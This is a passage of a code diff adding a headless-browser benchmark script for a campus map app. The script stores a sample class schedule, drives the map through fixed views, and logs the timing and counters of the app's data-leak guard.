+  instructor: 'Prof. Isolde Marchbanks',
+};
+
+const browser = await launch(chromium, { maxMs: 600000 });
+const ctx = await browser.newContext({ viewport: { width: 1280, height: 800 } });
+const page = await ctx.newPage();
+page.on('pageerror', (e) => console.log('PAGEERROR: ' + e.message));
+
+await page.goto(BASE + '/index.html?walk=1&drift=0', { waitUntil: 'domcontentloaded' });
+await page.evaluate(() => { try { window.cancelGraphicsAutoDetect && window.cancelGraphicsAutoDetect(); } catch (e) {} });
+await page.waitForFunction(() => window.__map && window.__map.isStyleLoaded && window.__map.isStyleLoaded(), null, { timeout: 180000 });
+await page.waitForTimeout(8000);
+
+// store (or deliberately do not store) a schedule, then arm and start timing
+await page.evaluate(([c, none]) => {
+  if (none) { window.WAYFIND.store.clear(); }
+  else {
+    window.WAYFIND.store.save({
+      term: 'Fall 2026', tz: 'America/Chicago',
+      sources: [{ kind: 'ut-registration' }],
+      classes: [{ code: 'BUR', room: '0.220', title: c.title, instructor: c.instructor,
+                  days: ['M', 'W'], startMin: 540, endMin: 600 }],
+    });
+  }
+  window.WAYFIND.store.guard.arm();
+  window.__gt = 0; window.__gn = 0;
+  const pm = Worker.prototype.postMessage;      // already the guarded one
+  Worker.prototype.postMessage = function () {
+    const a = performance.now();
+    try { return pm.apply(this, arguments); }
+    finally { window.__gt += performance.now() - a; window.__gn++; }
+  };
+}, [C, noSched]);
+
+// ── the drive. Identical every rep: no key held, no random content. ────────
+const LEGS = [
+  { center: [-97.7395, 30.2849], zoom: 15.2, pitch: 55, bearing: 20 },
+  { center: [-97.7370, 30.2860], zoom: 17.0, pitch: 62, bearing: 95 },
+  { center: [-97.7420, 30.2830], zoom: 18.2, pitch: 70, bearing: 190 },
+  { center: [-97.7345, 30.2895], zoom: 16.0, pitch: 45, bearing: 300 },
+  { center: [-97.7400, 30.2865], zoom: 18.6, pitch: 74, bearing: 15 },
+  { center: [-97.7380, 30.2840], zoom: 14.5, pitch: 40, bearing: 120 },
+];
+for (const leg of LEGS) {
+  await page.evaluate((l) => { window.__map.jumpTo(l); }, leg);
+  await page.waitForTimeout(2600);
+}
+await page.waitForTimeout(4000);
+
+const out = await page.evaluate(() => {
+  const s = window.WAYFIND.store.guard.state();
+  const m = window.__map;
+  return {
+    guardMs: Math.round(window.__gt), guardCalls: window.__gn,
+    watched: s.watched, armed: s.armed,
+    blocked: s.blocked, opaqueWorkerLeaves: s.opaqueWorkerLeaves,
+    truncatedScans: s.truncatedScans, scanThrows: s.scanThrows,
+    inspectFailures: s.inspectFailures,
+    binaryLeaves: s.binaryLeaves, binaryMB: +(s.binaryBytes / 1048576).toFixed(1),
+    frameChecked: s.frameChecked, swChecked: s.swChecked, rtcChecked: s.rtcChecked,
+    bodyBytesScanned: s.bodyBytesScanned, portChecked: s.portChecked,
+    styleLoaded: m.isStyleLoaded(), tilesLoaded: m.areTilesLoaded(),
+    buildings: (() => { try { return m.querySourceFeatures('composite', { sourceLayer: 'building' }).length; } catch (e) { return -1; } })(),
+    layers: m.getStyle().layers.length,
+  };
+});
+
+if (shotAt) {
+  // README: settle, screenshot twice, trust the second.
+  await page.evaluate((l) => { window.__map.jumpTo(l); }, { center: [-97.7396, 30.2862], zoom: 16.6, pitch: 62, bearing: 28 });
+  await page.waitForTimeout(6000);
+  await page.screenshot({ path: shotAt, type: 'jpeg', quality: 80 });
+  await page.waitForTimeout(1500);
+  await page.screenshot({ path: shotAt, type: 'jpeg', quality: 80 });
+}
+
+console.log(label + ' ' + JSON.stringify(out));
+await browser.close();
+process.exit(0);
 ```
